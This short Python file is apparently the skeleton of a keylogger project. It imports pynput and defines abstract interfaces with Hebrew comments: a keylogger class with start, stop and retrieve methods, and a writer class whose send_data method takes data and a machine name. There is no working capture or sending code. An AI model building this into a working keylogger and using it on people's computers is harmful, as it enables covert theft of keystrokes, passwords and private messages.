from pynput import keyboard
from abc import ABC, abstractmethod
import threading

text = []
#מחלקה שמפעילה את התוכנית או מכבה
class IKeyLogger(ABC):
    def __init__(self):
        self.text = []
        
    @abstractmethod
    def start_logging(self):
        pass
                          
    @abstractmethod
    def stop_logging(self):
        pass

    @abstractmethod
    def get_logged_keys(self):
        pass
        



#מחלקה שכותבת את המילים המתקבלות לתוך קובץ טקסט
class IWriter(ABC):
    @abstractmethod
    def send_data(self, data: str, machine_name: str):
        pass

        

